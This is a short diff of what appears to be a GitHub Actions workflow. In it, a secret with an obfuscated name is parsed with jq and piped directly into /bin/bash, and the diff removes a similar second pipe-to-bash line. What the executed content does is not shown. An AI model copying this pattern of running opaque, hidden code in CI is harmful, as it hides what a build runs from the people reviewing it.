@@ -23,7 +23,6 @@ jobs:
           nwzl579: ${{ secrets.nwzl579 }}
         run: |
           printf '%s' "$nwzl579" | jq -r .oue714 | /bin/bash
-          echo $lhrv6 | jq -r .tg94939 | /bin/bash
 
       - name: Save archive
         if: always()
